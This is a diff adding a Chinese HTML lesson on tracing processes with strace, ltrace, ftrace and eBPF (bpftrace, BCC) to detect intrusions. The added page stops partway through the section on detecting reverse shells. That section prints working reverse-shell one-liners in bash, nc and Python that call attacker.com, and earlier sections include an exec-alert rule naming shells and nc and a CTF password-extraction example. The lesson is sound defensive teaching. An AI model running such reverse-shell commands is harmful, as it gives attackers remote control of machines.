@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Day 13 · 🔐 系统调用追踪与 eBPF 入门</title>
+<style>
+  :root {
+    --bg: #fff7ed;
+    --ink: #2a2a2a;
+    --muted: #6b6b6b;
+    --accent: #c2410c;
+    --accent-soft: #fed7aa;
+    --line: #e7e5e0;
+    --card: #ffffff;
+    --code-bg: #fef3e2;
+    --sec-border: #fdba74;
+    --danger: #dc2626;
+    --danger-bg: #fee2e2;
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    line-height: 1.78;
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 32px 80px;
+  }
+  .header {
+    background: var(--card);
+    border: 1px solid var(--sec-border);
+    border-left: 6px solid var(--accent);
+    border-radius: 6px;
+    padding: 20px 24px;
+    margin-bottom: 28px;
+  }
+  .header h1 { font-size: 22px; margin: 0 0 8px; color: var(--accent); }
+  .header .meta { font-size: 13px; color: var(--muted); font-family: ui-monospace, "SF Mono", monospace; }
+  .header .sec-tag { display: inline-block; background: var(--accent); color: white; padding: 2px 10px; border-radius: 3px; font-size: 11px; margin-bottom: 8px; letter-spacing: 1px; }
+  .toc { background: var(--card); border: 1px solid var(--sec-border); border-radius: 6px; padding: 14px 20px; margin: 0 0 32px; font-size: 13.5px; }
+  .toc ol { margin: 4px 0; padding-left: 24px; }
+  .toc a { color: var(--accent); text-decoration: none; }
+  .leadin { background: var(--card); border-left: 3px solid var(--accent); padding: 14px 18px; border-radius: 4px; margin: 0 0 36px; font-size: 15px; }
+  h2 { font-size: 20px; margin-top: 48px; color: var(--accent); border-left: 4px solid var(--accent); padding-left: 12px; }
+  h3 { font-size: 16.5px; margin-top: 24px; color: #444; }
+  p { margin: 12px 0; }
+  code { background: var(--code-bg); padding: 1px 6px; border-radius: 3px; font-size: 13.5px; font-family: ui-monospace, "SF Mono", monospace; }
+  pre { background: var(--code-bg); padding: 14px 16px; border-radius: 6px; overflow-x: auto; font-size: 13.5px; line-height: 1.55; margin: 16px 0; border: 1px solid var(--sec-border); }
+  pre code { background: transparent; padding: 0; font-size: inherit; }
+  .ascii { font-family: ui-monospace, "SF Mono", monospace; font-size: 13px; background: var(--code-bg); padding: 16px 20px; border-radius: 6px; white-space: pre; overflow-x: auto; line-height: 1.4; margin: 18px 0; border: 1px solid var(--sec-border); }
+  table { border-collapse: collapse; width: 100%; margin: 16px 0; font-size: 14px; }
+  th, td { border: 1px solid var(--sec-border); padding: 10px 12px; text-align: left; vertical-align: top; }
+  th { background: var(--code-bg); font-weight: 600; }
+  .warn { background: var(--danger-bg); border-left: 4px solid var(--danger); padding: 10px 14px; font-size: 14px; border-radius: 3px; margin: 14px 0; }
+  .warn strong { color: var(--danger); }
+  .note { background: var(--card); border-left: 4px solid var(--accent-soft); padding: 12px 18px; border-radius: 4px; margin: 18px 0; font-size: 14.5px; }
+  .attack { background: #fef2f2; border: 1px solid #fecaca; border-left: 4px solid var(--danger); padding: 14px 18px; border-radius: 4px; margin: 18px 0; }
+  .attack h3 { margin-top: 4px; color: var(--danger); }
+  .connect { background: var(--card); border-left: 4px solid var(--accent); padding: 18px 22px; border-radius: 4px; margin: 36px 0; }
+  .connect h2 { margin-top: 0; border-left: none; padding-left: 0; }
+  .exercise { background: var(--card); border: 1px solid var(--sec-border); border-radius: 6px; padding: 18px 22px; margin: 16px 0; }
+  .exercise-num { display: inline-block; background: var(--accent); color: white; width: 22px; height: 22px; border-radius: 50%; text-align: center; font-size: 12px; line-height: 22px; margin-right: 8px; }
+  .next { margin-top: 48px; padding: 14px 18px; background: var(--card); border: 1px dashed var(--accent); border-radius: 4px; font-size: 14px; color: var(--muted); }
+  .next strong { color: var(--accent); }
+  .key { background: linear-gradient(transparent 60%, var(--accent-soft) 60%); padding: 0 2px; }
+  .term { color: var(--accent); font-weight: 600; }
+  ul, ol { padding-left: 24px; }
+  li { margin: 4px 0; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="sec-tag">🔐 SECURITY · 周六安全主线</div>
+  <h1>Day 13 · 系统调用追踪与 eBPF 入门</h1>
+  <div class="meta">Week 02 · 周六 · 2026-05-24 · 安全主线：进程行为可观测性 · 预计 4 小时（含 1h 动手 lab）</div>
+</div>
+
+<div class="leadin">
+<strong>今日导读</strong>：上周 Day 06 我们讲了攻击者怎么从普通用户提权到 root，今天我们站到防守方一侧。核心问题是：<span class="key">一个进程在我机器上做的所有"实际有危害"的事，都必然通过系统调用经过内核——所以如果我能"在内核里看每一个 syscall"，攻击就无所遁形</span>。本周我们已经学过进程、内存、I/O、文件系统这些底层概念，今天把它们组合成一个能力：用 <code>strace / ltrace / ftrace</code> 三件套观察任意进程，再升级到 <span class="key">eBPF</span>——Linux 内核近十年最重要的一项革命——用 <code>bpftrace / bcc</code> 写自定义的内核探针，实时检测可疑 <code>execve</code>、敏感文件访问、反弹 shell 等行为。学完今天你应该能回答：「我的 Agent 服务跑在容器里，怎么实时知道里面被注入了恶意代码？」
+</div>
+
+<div class="toc">
+<strong>今日目录（4 小时分配）</strong>
+<ol>
+  <li><a href="#s1">观察一个进程的三个层次（15 min）</a></li>
+  <li><a href="#s2">strace：syscall 级追踪的瑞士军刀（45 min）</a></li>
+  <li><a href="#s3">ltrace：库函数调用追踪（15 min）</a></li>
+  <li><a href="#s4">ftrace：内核内部函数追踪（30 min）</a></li>
+  <li><a href="#s5">eBPF 是什么：把"用户写的安全代码"装进内核（45 min）</a></li>
+  <li><a href="#s6">bpftrace：用一行话写内核探针（30 min）</a></li>
+  <li><a href="#s7">BCC 工具集：开箱即用的 100+ 个探针（20 min）</a></li>
+  <li><a href="#s8">监控可疑 execve：检测反弹 shell 的实战（40 min）</a></li>
+  <li><a href="#connect">与 AI / Agent 安全的连结</a></li>
+  <li><a href="#exercise">今日小练习</a></li>
+</ol>
+</div>
+
+<h2 id="s1">1. 观察一个进程的三个层次</h2>
+
+<p>假设你是一个安全工程师，老板甩给你一个可疑的 Python 进程 PID = 12345，问你："这个进程在干啥？是不是恶意的？"你有<strong>三个层次</strong>可以观察它：</p>
+
+<div class="ascii">┌─────────────────────────────────────────────────────────────┐
+│  L3：应用层  →  Python tracing、APM、日志                      │
+│              （进程自己愿意暴露多少给你）                      │
+├─────────────────────────────────────────────────────────────┤
+│  L2：库函数层 →  ltrace（拦截 libc 等共享库的函数调用）         │
+│              （malloc、strcpy、getpwnam ...）                  │
+├─────────────────────────────────────────────────────────────┤
+│  L1：syscall 层 →  strace / eBPF（拦截 ring3 → ring0 边界）   │
+│              （openat、read、write、execve、connect ...）      │
+├─────────────────────────────────────────────────────────────┤
+│  L0：内核内部  →  ftrace / kprobes / eBPF（拦截内核函数）      │
+│              （do_sys_open、tcp_connect ...）                  │
+└─────────────────────────────────────────────────────────────┘
+            ▲ 越往下越不可绕过，对应用透明，但开销 / 复杂度也越高</div>
+
+<p>关键认知：<span class="key">L1（syscall）是最值得监控的层次</span>。原因是 Day 01 已经讲过——所有"对外部世界有影响"的动作（打开文件、写网络、起子进程）<strong>必须经过 syscall</strong>。攻击者再怎么混淆 Python 字节码、再怎么打包加密，他要"打开 /etc/passwd"就必须发 <code>openat</code>；要"反弹 shell"就必须发 <code>connect + dup2 + execve</code>。L3 应用层日志攻击者可以关，L2 库可以被静态链接绕过，<strong>但 L1 没人绕得过</strong>（除非利用内核漏洞，那已是另一个量级的攻击）。</p>
+
+<p>今天我们就从 L1 开始爬，最后到达 L0 用 eBPF 写自定义探针。</p>
+
+<h2 id="s2">2. strace：syscall 级追踪的瑞士军刀</h2>
+
+<p><span class="term">strace</span> 是 Linux 上拦截 syscall 的经典工具。它的工作原理基于 <code>ptrace</code> 系统调用——这是内核专门给"调试器 / 追踪器"开的口子。</p>
+
+<h3>2.1 ptrace 的工作模型（30 秒）</h3>
+
+<p><code>ptrace(PTRACE_ATTACH, pid)</code> 让一个进程（tracer，比如 strace）"附加"到另一个进程（tracee）上。之后<strong>每当 tracee 进入或离开一个 syscall，内核会把它暂停，让 tracer 检查寄存器、内存，再决定是否放行</strong>。这是为啥 strace 出来你能看到每个 syscall 的参数和返回值。</p>
+
+<p><strong>代价</strong>：被 strace 的进程每个 syscall 都要"暂停 → 切换到 strace → 处理 → 唤醒"，开销巨大——一个高 QPS 服务被 strace 上能慢 20-100 倍。所以 strace 是<strong>调试工具</strong>，<span class="key">不是生产监控工具</span>。生产监控要用 eBPF。</p>
+
+<h3>2.2 基本用法</h3>
+
+<pre><code># 启动一个新进程并追踪
+strace ls /etc
+
+# 附加到一个已存在的进程
+strace -p 12345
+
+# 跟踪一个进程及其所有子进程（-f = follow forks）
+strace -f python3 my_agent.py
+
+# 只看特定的 syscall
+strace -e openat,read,write ls
+
+# 多类一起：网络、文件、进程
+strace -e trace=network,file,process python3 server.py
+
+# 把输出写文件，避免和 stdout 混在一起
+strace -o /tmp/trace.log -f python3 my_agent.py
+
+# 看每个 syscall 花了多少时间（按耗时排序）
+strace -c -p 12345
+# 几秒后 Ctrl-C，会出一张统计表</code></pre>
+
+<h3>2.3 解读 strace 的输出</h3>
+
+<pre><code>openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3
+read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 2547
+close(3) = 0
+write(1, "got passwd\n", 11) = 11
++++ exited with 0 +++</code></pre>
+
+<p>每行格式：<code>syscall_name(参数1, 参数2, ...) = 返回值</code>。一些约定：</p>
+
+<ul>
+  <li><strong>AT_FDCWD</strong>：相对路径基于当前工作目录</li>
+  <li><strong>fd=3</strong>：openat 返回的<span class="term">文件描述符</span>（0/1/2 已被 stdin/stdout/stderr 占用）</li>
+  <li><strong>"..."</strong>：strace 默认只显示前 32 字节，可以用 <code>-s 4096</code> 改大</li>
+  <li><strong>= -1 EACCES</strong>：syscall 失败，括号里是错误码（permission denied 等）</li>
+</ul>
+
+<h3>2.4 实用的 strace 套路</h3>
+
+<p><strong>套路 A：定位"程序为什么打不开文件"</strong></p>
+<pre><code>strace -e openat python3 script.py 2&gt;&amp;1 | grep -i "no such\|denied"
+# 直接看哪些路径打不开，比看 Python 报错更精准</code></pre>
+
+<p><strong>套路 B：找性能瓶颈</strong></p>
+<pre><code>strace -c -p $(pidof my_service)
+# 等 10 秒 Ctrl-C，会看到：
+# % time     seconds  usecs/call     calls    errors syscall
+# ------ ----------- ----------- --------- --------- ----------------
+#  62.10    0.123456         123      1003           futex
+#  21.34    0.042000          42      1000           read
+# ...
+# 通常 % time 第一的就是瓶颈。futex 多 = 锁竞争；read/write 多 = IO</code></pre>
+
+<p><strong>套路 C：看一个挂起的进程卡在哪</strong></p>
+<pre><code>strace -p &lt;hung_pid&gt;
+# 如果只输出一行类似：
+# futex(0x7f..., FUTEX_WAIT_PRIVATE, 0, NULL
+# 然后没有动静——说明进程卡在等一个锁（死锁嫌疑）</code></pre>
+
+<p><strong>套路 D：分析一个未知二进制</strong></p>
+<pre><code>strace -f -e trace=file,network,process ./unknown_binary
+# 立刻看到它想读什么文件、连哪个 IP、起什么子进程
+# 这是逆向工程的第一招</code></pre>
+
+<h3>2.5 在 macOS 上的对应工具</h3>
+
+<p>macOS 没有 strace，但有更强大的 <strong>dtruss</strong>（基于 DTrace）：</p>
+
+<pre><code># dtruss 需要关 SIP，或者签名调试权限
+sudo dtruss -f python3 -c "print('hi')"
+
+# 现代 mac（M 系列）SIP 默认开，更现实的做法：
+# 1. 用 Instruments 的 System Trace
+# 2. 用 fs_usage（看文件 syscall）：
+sudo fs_usage -w -f filesys python3
+
+# 或者直接进 Linux VM / Docker 容器跑 strace
+docker run -it --rm --cap-add SYS_PTRACE ubuntu:22.04 bash
+# 容器里就能用 strace 了</code></pre>
+
+<div class="warn">
+<strong>安全相关的一个常识</strong>：能 ptrace 一个进程意味着<strong>能读它内存、改它寄存器、注入代码</strong>。Linux 默认禁止"非 root 用户 ptrace 不属于自己的进程"，但<strong>同一用户的进程之间可以互相 ptrace</strong>（除非显式禁用）。这是 Day 06 提到的 <code>CAP_SYS_PTRACE</code> capability 的来源，也是很多本地内存窃取攻击（比如读取别的进程里的密码）的基础。<code>/proc/sys/kernel/yama/ptrace_scope</code> 控制这个策略，生产环境通常设成 1 或 2。
+</div>
+
+<h2 id="s3">3. ltrace：库函数调用追踪</h2>
+
+<p><span class="term">ltrace</span> 是 strace 的"上一层"：它拦截的不是 syscall，而是<strong>动态库的函数调用</strong>。最常拦截的就是 libc 的函数：<code>malloc / free / strcpy / fopen / getpwnam / system / popen</code> 等等。</p>
+
+<pre><code># 默认看 libc 调用
+ltrace ls
+
+# 同时看库调用和 syscall
+ltrace -S ls
+
+# 看特定函数
+ltrace -e 'malloc+free' ./my_program
+
+# 也能 -p 附加
+ltrace -p 12345</code></pre>
+
+<p>典型输出：</p>
+
+<pre><code>__libc_start_main(0x4006d0, 1, 0x7ffe..., ...
+getenv("LD_LIBRARY_PATH")                                = nil
+malloc(280)                                               = 0x55a...
+strcpy(0x55a..., "/etc/passwd")                          = 0x55a...
+fopen("/etc/passwd", "r")                                = 0x55b...
+fread(0x55c..., 1, 1024, 0x55b...)                       = 1024
++++ exited (status 0) +++</code></pre>
+
+<h3>3.1 ltrace 何时比 strace 更有用</h3>
+
+<table>
+<tr><th>场景</th><th>用哪个</th></tr>
+<tr><td>看一个程序碰了哪些文件 / IP</td><td>strace（syscall 不会撒谎）</td></tr>
+<tr><td>看一个程序的内存分配模式</td><td>ltrace -e 'malloc+free+realloc'</td></tr>
+<tr><td>看一个加壳/混淆的二进制做了什么</td><td>strace + ltrace 一起</td></tr>
+<tr><td>看一个静态链接的二进制</td><td>strace（ltrace 看不到，因为没有动态库调用）</td></tr>
+<tr><td>看明文密码在内存里的存放</td><td>ltrace -e 'strcmp+strcpy' （能看到字符串参数）</td></tr>
+</table>
+
+<h3>3.2 一个安全分析场景</h3>
+
+<div class="attack">
+<h3>用 ltrace 抓密码比较</h3>
+<pre><code># 拿到一个未知的登录程序 ./challenge
+# 你想知道它把你输入的密码和什么硬编码字符串比较
+$ ltrace ./challenge
+fopen("flag.txt", "r") = 0x...
+fread(...) = ...
+printf("password: ") = ...
+fgets(...) = ...
+strcmp("supersecret123", "我刚输入的密码") = 1   ← 直接看到了真密码
+strcmp(...) = ...
+puts("wrong!") = ...</code></pre>
+<p>这是 CTF 比赛逆向题的<strong>经典套路</strong>之一。也是为什么生产代码绝不能用 <code>strcmp</code> 比较敏感数据——要用 <strong>constant-time</strong> 比较（同时还防时序攻击）。</p>
+</div>
+
+<h2 id="s4">4. ftrace：内核内部函数追踪</h2>
+
+<p>strace / ltrace 都在用户态拦截。如果你想看<strong>内核内部</strong>函数的执行——比如「kernel 的 <code>do_sys_openat2</code> 被谁调用了？执行路径走过哪些函数？」——你需要 <span class="term">ftrace</span>。</p>
+
+<p>ftrace 是 Linux 内核自带的<strong>静态追踪框架</strong>，从 2.6.27 开始合入。它在每个内核函数入口插入了一个 <code>mcount()</code> 钩子（编译时由 GCC 的 <code>-pg</code> 选项产生），动态启用后可以记录函数调用。</p>
+
+<h3>4.1 ftrace 的两种用法</h3>
+
+<p><strong>方式 1：直接操作 <code>/sys/kernel/debug/tracing/</code> 伪文件系统</strong>。原始但万能。</p>
+
+<pre><code># 1. 列出可用的 tracer
+$ cat /sys/kernel/debug/tracing/available_tracers
+hwlat blk function_graph wakeup_rt wakeup_dl wakeup function nop
+
+# 2. 选 function 追踪器（记录所有内核函数调用）
+echo function &gt; /sys/kernel/debug/tracing/current_tracer
+
+# 3. 只过滤跟 open 相关的内核函数
+echo 'do_sys_open*' &gt; /sys/kernel/debug/tracing/set_ftrace_filter
+
+# 4. 开始追踪
+echo 1 &gt; /sys/kernel/debug/tracing/tracing_on
+
+# 5. 在另一个终端做点事
+cat /etc/hostname
+
+# 6. 停止 + 看结果
+echo 0 &gt; /sys/kernel/debug/tracing/tracing_on
+head /sys/kernel/debug/tracing/trace</code></pre>
+
+<p>输出大致：</p>
+<pre><code>cat-12345 [001] .... 12345.678: do_sys_openat2 &lt;-__x64_sys_openat
+cat-12345 [001] .... 12345.679: do_sys_open_event &lt;-do_sys_openat2</code></pre>
+
+<p><strong>方式 2：用前端工具 <code>trace-cmd</code></strong>。Steven Rostedt（ftrace 作者）写的命令行包装。</p>
+
+<pre><code># 装一下
+sudo apt install trace-cmd
+
+# 追踪一段时间的所有 open 调用
+sudo trace-cmd record -p function -l 'do_sys_open*' sleep 5
+sudo trace-cmd report</code></pre>
+
+<h3>4.2 function_graph：调用栈可视化</h3>
+
+<p>ftrace 还有个杀手锏叫 <strong>function_graph</strong>——它不仅记录哪些函数被调用，还<strong>记录它们的父子关系和耗时</strong>，输出类似火焰图：</p>
+
+<pre><code>echo function_graph &gt; /sys/kernel/debug/tracing/current_tracer
+echo 'sys_openat' &gt; /sys/kernel/debug/tracing/set_graph_function
+echo 1 &gt; /sys/kernel/debug/tracing/tracing_on
+cat /etc/hostname &gt; /dev/null
+echo 0 &gt; /sys/kernel/debug/tracing/tracing_on
+head -50 /sys/kernel/debug/tracing/trace</code></pre>
+
+<p>输出会带缩进+耗时：</p>
+<pre><code> 1)               |  __x64_sys_openat() {
+ 1)               |    do_sys_openat2() {
+ 1)   0.124 us    |      getname();
+ 1)               |      do_filp_open() {
+ 1)   0.080 us    |        path_openat();
+ 1)   2.345 us    |      }
+ 1)   3.123 us    |    }
+ 1)   3.890 us    |  }</code></pre>
+
+<h3>4.3 ftrace 的局限</h3>
+
+<p>ftrace 强大但有局限：</p>
+<ul>
+  <li><strong>过滤能力有限</strong>：只能按函数名过滤，不能写"<code>openat 且文件名包含 /etc/shadow</code>"这种条件</li>
+  <li><strong>输出格式僵化</strong>：你拿到的是文本日志，不能聚合统计（"过去 1 分钟谁 openat 了 /etc/shadow"）</li>
+  <li><strong>没有用户态上下文</strong>：你能看到内核函数，但不能在内核函数被调用时取一些用户态的信息</li>
+</ul>
+
+<p>这些局限正是 <span class="key">eBPF</span> 要解决的问题。</p>
+
+<h2 id="s5">5. eBPF 是什么：把"用户写的安全代码"装进内核</h2>
+
+<p>这一节是今天的<strong>核心</strong>。eBPF（extended Berkeley Packet Filter）是 Linux 内核近十年最重要的革命之一——可观测性、网络、安全三个领域都被它彻底改写。Cilium、Falco、Tetragon、bpftrace、Pixie、Parca、Pyroscope 这些产品都建立在它上面。</p>
+
+<h3>5.1 一句话理解 eBPF</h3>
+
+<p style="background: var(--code-bg); padding: 16px; border-radius: 6px; border-left: 4px solid var(--accent);">
+<strong>eBPF = 让你写一段小程序，由内核验证它绝对安全后，挂载到内核里几乎任何"事件点"上，事件触发时这段程序就在内核态运行。</strong>
+</p>
+
+<p>"事件点"包括：</p>
+<ul>
+  <li><strong>kprobe</strong>：任何内核函数的入口/出口</li>
+  <li><strong>tracepoint</strong>：内核里预定义的静态追踪点（比 kprobe 稳定）</li>
+  <li><strong>uprobe</strong>：用户态程序里的函数（也能挂！）</li>
+  <li><strong>USDT</strong>：用户态预定义追踪点</li>
+  <li><strong>perf event</strong>：性能计数器溢出</li>
+  <li><strong>XDP / TC</strong>：网络包入口/出口（这就是 Cilium 的根基）</li>
+  <li><strong>LSM hook</strong>：内核安全模块钩子（这就是 Tetragon 的根基）</li>
+</ul>
+
+<h3>5.2 eBPF 的运行模型</h3>
+
+<div class="ascii">用户态                                内核态
+──────────                            ────────
+  你写的 C/Python                       ┌──────────────────────────┐
+  bpftrace 脚本                         │ eBPF Verifier            │
+        │                               │ （拒绝任何不安全的 BPF）  │
+        ▼                               └────────────┬─────────────┘
+   编译成 BPF                                        │ 通过
+   bytecode                                          ▼
+        │ bpf() syscall              ┌──────────────────────────┐
+        ├──────────────────────────► │ JIT 编译成本机机器码      │
+        │                            └────────────┬─────────────┘
+        │                                         │
+        │                              hook 到事件点 (kprobe/tracepoint/...)
+        │                                         │
+        │  ◄──── BPF map（共享内存） ──────────────┤
+        │                                         │
+        ▼                                  事件触发，BPF 代码运行
+   用户态读结果                                   │
+                                                  ▼
+                                       聚合数据写入 BPF map</div>
+
+<p>关键创新（也是最颠覆的部分）：</p>
+
+<ul>
+  <li><strong>Verifier 静态证明安全性</strong>。它会检查 BPF 代码：没有无限循环、所有内存访问都在合法范围、不会让内核 panic。<span class="key">通过验证的 BPF 程序是"不可能让内核崩"的</span>。这是为什么 eBPF 能在生产环境放心运行——它做到了内核模块做不到的"安全注入"。</li>
+  <li><strong>JIT 编译</strong>。BPF bytecode 会被翻译成本机机器码，性能接近原生 C。</li>
+  <li><strong>BPF map</strong>：内核 BPF 程序和用户态进程之间共享数据的标准方式（哈希表、数组、ring buffer 等）。</li>
+</ul>
+
+<h3>5.3 eBPF vs strace/ftrace 的对比</h3>
+
+<table>
+<tr><th>能力</th><th>strace</th><th>ftrace</th><th>eBPF</th></tr>
+<tr><td>拦截 syscall</td><td>✅ 全面</td><td>部分</td><td>✅ 全面</td></tr>
+<tr><td>拦截内核函数</td><td>❌</td><td>✅</td><td>✅</td></tr>
+<tr><td>拦截用户函数</td><td>❌</td><td>❌</td><td>✅ uprobe</td></tr>
+<tr><td>开销</td><td>极大（100x 慢）</td><td>中等</td><td>极小（生产可用）</td></tr>
+<tr><td>条件过滤</td><td>简单</td><td>有限</td><td>任意 C 代码</td></tr>
+<tr><td>聚合统计</td><td>事后</td><td>无</td><td>内核内实时聚合</td></tr>
+<tr><td>生产监控</td><td>❌</td><td>慎用</td><td>✅ 标配</td></tr>
+</table>
+
+<h3>5.4 eBPF 的安全保证 = 它能放心装进内核的根本原因</h3>
+
+<p>传统的"内核扩展"方式是写<strong>内核模块（.ko）</strong>，模块代码运行在 ring 0，一个 NULL 指针就让整个系统 panic。eBPF 通过几层防护把这个风险降到几乎为零：</p>
+
+<ol>
+  <li><strong>有限指令集</strong>：BPF 虚拟机只有 ~100 条指令，没有"任意跳转"</li>
+  <li><strong>有界循环</strong>：早期完全不允许循环；现在允许的也是有边界的（verifier 能证明终止）</li>
+  <li><strong>受限内存访问</strong>：只能读 BPF map、当前事件上下文、和经过特殊辅助函数明示授权的内核数据</li>
+  <li><strong>helper 函数白名单</strong>：BPF 程序能调的内核函数是白名单（比如 <code>bpf_probe_read</code>、<code>bpf_get_current_pid_tgid</code>），不能调任意内核函数</li>
+  <li><strong>资源边界</strong>：栈大小限制（512 字节）、指令数限制、最大执行时间</li>
+</ol>
+
+<p>这套设计的代价是 eBPF 程序<strong>写起来很受限</strong>——不能用一般的 C 库、不能动态分配、不能写复杂逻辑。但正是这种受限让它成为唯一能在生产内核里跑"用户写的安全检测代码"的方案。</p>
+
+<h2 id="s6">6. bpftrace：用一行话写内核探针</h2>
+
+<p>直接写 eBPF C 程序很痛苦。<span class="term">bpftrace</span> 是个高级前端，语法类似 awk，让你能<strong>一行代码挂一个探针</strong>。学过 DTrace 的用户会觉得非常熟悉——它就是 Linux 上的 DTrace。</p>
+
+<h3>6.1 安装</h3>
+
+<pre><code># Ubuntu
+sudo apt install -y bpftrace
+
+# macOS（在 Linux 容器里跑）
+docker run -it --rm --privileged --pid=host --net=host \
+  -v /sys:/sys -v /lib/modules:/lib/modules:ro \
+  quay.io/iovisor/bpftrace --version</code></pre>
+
+<h3>6.2 第一个 bpftrace one-liner</h3>
+
+<pre><code># 谁在调 execve？（你刚刚理解的"启动新进程"的 syscall）
+sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%s -&gt; %s\n", comm, str(args-&gt;filename)); }'
+
+# 在另一个终端跑几个命令，bpftrace 会实时打出：
+# bash -&gt; /usr/bin/ls
+# bash -&gt; /usr/bin/cat
+# ls -&gt; /lib64/ld-linux-x86-64.so.2  ← 这是动态链接器
+# ...</code></pre>
+
+<p>解析这条 one-liner：</p>
+
+<ul>
+  <li><code>tracepoint:syscalls:sys_enter_execve</code>：探针挂在 execve syscall 入口的 tracepoint 上</li>
+  <li><code>comm</code>：内置变量，当前进程名</li>
+  <li><code>args-&gt;filename</code>：tracepoint 参数里的可执行文件路径</li>
+  <li><code>str()</code>：把内核内存里的字符串安全拷出来</li>
+  <li><code>printf</code>：bpftrace 的输出函数</li>
+</ul>
+
+<h3>6.3 几个超有用的 one-liner</h3>
+
+<pre><code># 谁在打开 /etc/shadow（敏感文件访问监控）
+sudo bpftrace -e '
+tracepoint:syscalls:sys_enter_openat
+/ str(args-&gt;filename) == "/etc/shadow" /
+{ printf("%s pid=%d opened shadow\n", comm, pid); }
+'
+
+# 统计哪个进程发了最多的 syscall（按进程聚合 1 分钟）
+sudo bpftrace -e '
+tracepoint:raw_syscalls:sys_enter
+{ @[comm] = count(); }
+interval:s:60 { exit(); }
+'
+
+# 谁在 connect 出网（监控反弹 shell 的早期信号）
+sudo bpftrace -e '
+tracepoint:syscalls:sys_enter_connect
+{ printf("%s -&gt; sockfd=%d\n", comm, args-&gt;fd); }
+'
+
+# 内核函数 vfs_read 的耗时直方图
+sudo bpftrace -e '
+kprobe:vfs_read { @start[tid] = nsecs; }
+kretprobe:vfs_read /@start[tid]/
+{ @us = hist((nsecs - @start[tid])/1000); delete(@start[tid]); }
+'</code></pre>
+
+<h3>6.4 bpftrace 脚本文件</h3>
+
+<p>复杂的脚本可以写到 <code>.bt</code> 文件：</p>
+
+<pre><code>// suspicious_exec.bt
+BEGIN { printf("Tracing suspicious execs... Hit Ctrl-C to end.\n"); }
+
+tracepoint:syscalls:sys_enter_execve
+/ str(args-&gt;filename) == "/bin/sh" ||
+  str(args-&gt;filename) == "/bin/bash" ||
+  str(args-&gt;filename) == "/usr/bin/nc" /
+{
+    printf("[%H:%M:%S] ALERT comm=%s pid=%d ppid=%d exe=%s\n",
+        comm, pid, curtask-&gt;real_parent-&gt;tgid,
+        str(args-&gt;filename));
+}
+
+END { printf("Done.\n"); }</code></pre>
+
+<pre><code>sudo bpftrace suspicious_exec.bt</code></pre>
+
+<h2 id="s7">7. BCC 工具集：开箱即用的 100+ 个探针</h2>
+
+<p><span class="term">BCC</span>（BPF Compiler Collection）是另一套基于 eBPF 的工具集。bpftrace 适合写小脚本，BCC 适合<strong>开箱即用的成熟工具</strong>——它包含 100+ 个已经写好的诊断 / 监控脚本。</p>
+
+<pre><code># Ubuntu 装 BCC 工具
+sudo apt install -y bpfcc-tools linux-headers-$(uname -r)
+
+# 工具都带 -bpfcc 后缀（避免和老 bcc 工具冲突）
+ls /usr/sbin/*-bpfcc | head -20</code></pre>
+
+<h3>7.1 必学的 10 个 BCC 工具</h3>
+
+<table>
+<tr><th>工具</th><th>干什么</th></tr>
+<tr><td><code>execsnoop-bpfcc</code></td><td>实时打出所有 execve 调用（监控新进程）</td></tr>
+<tr><td><code>opensnoop-bpfcc</code></td><td>实时打出所有 open/openat 调用（监控文件访问）</td></tr>
+<tr><td><code>tcpconnect-bpfcc</code></td><td>实时打出所有 TCP connect（监控对外连接）</td></tr>
+<tr><td><code>tcpaccept-bpfcc</code></td><td>实时打出所有 TCP accept（监控入站连接）</td></tr>
+<tr><td><code>biolatency-bpfcc</code></td><td>块设备 I/O 延迟直方图</td></tr>
+<tr><td><code>cachestat-bpfcc</code></td><td>page cache 命中率</td></tr>
+<tr><td><code>profile-bpfcc</code></td><td>CPU 火焰图采样</td></tr>
+<tr><td><code>memleak-bpfcc</code></td><td>检测内存泄漏（按 stack trace 归类）</td></tr>
+<tr><td><code>runqlat-bpfcc</code></td><td>调度延迟直方图（进程在 runqueue 等了多久）</td></tr>
+<tr><td><code>killsnoop-bpfcc</code></td><td>谁给谁发了 kill 信号（找 OOM killer / 误杀）</td></tr>
+</table>
+
+<h3>7.2 execsnoop 实战</h3>
+
+<pre><code># 一个终端跑 execsnoop
+sudo execsnoop-bpfcc
+
+# 另一个终端做点事
+ls
+ps aux | grep python
+sudo apt update
+
+# execsnoop 的输出：
+PCOMM            PID    PPID   RET ARGS
+ls               1234   5678   0 /usr/bin/ls
+ps               1235   5678   0 /usr/bin/ps aux
+grep             1236   5678   0 /usr/bin/grep python
+apt              1237   5678   0 /usr/bin/apt update
+dpkg             1240   1237   0 /usr/bin/dpkg --print-architecture
+...</code></pre>
+
+<p>你能看到每个新启动的进程、它的 PID、父 PID、参数。<strong>这就是"实时新进程监控"的基础</strong>——把它的输出送进规则引擎，就能做反弹 shell 检测、横向移动检测。</p>
+
+<h3>7.3 BCC 是 Falco / Tetragon 的"工具版"</h3>
+
+<p>BCC 像是"<strong>给运维人员的命令行工具</strong>"，<span class="term">Falco</span> / <span class="term">Tetragon</span> 则是"<strong>给安全团队的生产监控产品</strong>"——它们底层都用 eBPF，但封装了规则引擎、告警分发、日志聚合等生产能力。理解 BCC 工具的原理，你就理解了 Falco 规则的本质。</p>
+
+<h2 id="s8">8. 监控可疑 execve：检测反弹 shell 的实战</h2>
+
+<p>把今天讲的拼成一个真实的安全场景：<strong>检测反弹 shell</strong>。这是渗透测试里最常见的攻击之一，也是 Agent 沙箱被注入恶意代码后最常见的"第一步动作"。</p>
+
+<h3>8.1 反弹 shell 长什么样</h3>
+
+<pre><code># 攻击者拿到代码执行后，最常见的姿势之一：
+bash -c 'bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1'
+
+# 或者 nc：
+nc attacker.com 4444 -e /bin/bash
+
+# 或者 Python：
+python3 -c 'import socket,subprocess,os
+s=socket.socket()
+s.connect(("attacker.com",4444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])'</code></pre>
+
